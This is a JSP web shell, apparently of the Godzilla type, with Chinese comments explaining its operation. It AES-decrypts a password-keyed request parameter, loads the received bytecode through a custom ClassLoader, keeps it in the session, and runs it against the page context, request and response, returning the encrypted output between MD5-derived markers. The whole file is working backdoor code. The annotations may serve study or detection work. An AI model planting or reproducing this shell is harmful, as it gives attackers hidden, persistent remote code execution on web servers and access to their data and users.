<%! String xc = "3c6e0b8a9c15224a";
    String pass = "pass";
    String md5 = md5(pass + xc);

    //自定义加载器
    class X extends ClassLoader {
        public X(ClassLoader z) {
            super(z);
        }

        public Class Q(byte[] cb) {
            return super.defineClass(cb, 0, cb.length);
        }
    }

    //加密解密
    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }%>

<%
    try {
        //收到的数据进行解码
        byte[] data = base64Decode(request.getParameter(pass));
        //数据解密
        data = x(data, false);
        //第一次连接
        if (session.getAttribute("payload") == null) {
            //把传入的类通过自定义加载器加载到jvm，并存到session里面
            session.setAttribute("payload", new X(this.getClass().getClassLoader()).Q(data));
        } else {
            //把收到的pyload存入request,也可不存入request,还可通过payload#equal传入
            request.setAttribute("parameters", data);
            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
            //取出session里面的payload进行初始化
            Object f = ((Class) session.getAttribute("payload")).newInstance();
            //重点关注，第一次连接发过来的payload做的操作
            //设置每次请求用的输出流，在下面toString会用到
            f.equals(arrOut);
            //对各种属性进行初始化，上下文对象，req、res、session、请求参数
            f.equals(pageContext);
            //标记
            response.getWriter().write(md5.substring(0, 16));
            //核心方法，payload里面对toString进行了重写。toString里面重点调用run方法，通过反射调用payload内置方法
            f.toString();
            //数据加密，返回
            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
            //标记，在前后打上标记，方便后面取数据
            response.getWriter().write(md5.substring(16));
        }
    } catch (Exception e) {
    }
%>